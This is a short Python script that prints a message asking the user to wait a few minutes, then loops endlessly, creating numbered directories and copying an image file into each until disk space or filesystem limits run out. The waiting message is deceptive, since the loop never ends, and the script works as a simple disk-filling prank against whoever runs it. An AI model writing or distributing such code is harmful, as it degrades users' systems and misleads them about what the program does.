import os,shutil
print("wait for 2 to 3 minutes...")
i=0
d = os.getcwd()
while True:
    os.mkdir(f'new{i}')
    shutil.copy('2.jpeg',f'{d}/new{i}')
    i += 1
